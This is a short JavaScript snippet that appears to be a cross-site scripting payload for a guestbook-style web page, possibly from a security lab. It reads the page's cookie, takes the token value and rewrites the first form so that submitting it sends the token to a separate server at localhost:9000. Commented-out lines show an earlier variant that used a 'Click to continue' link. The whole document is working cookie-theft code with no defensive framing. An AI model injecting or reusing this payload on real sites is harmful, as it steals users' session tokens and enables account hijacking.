token = document.cookie.split("=")[1]
// target_elements = document.querySelectorAll("form")
// console.log("target_elements")
// console.log(target_elements.length)
// url = "http://localhost:9000/" + token
// target_elements[0].innerHTML = "<a href=" + url + ">Click to continue</a>"
console.log("Gotcha!")

form = document.querySelectorAll("form")[0]
url = "http://localhost:9000/" + token
newform = "<form action=" + url + " method=get>"
newform += "<p><input name=guest></p>"
newform += "<p><button>Sign the book!</button></p>"
newform += "</form>"
form.innerHTML= newform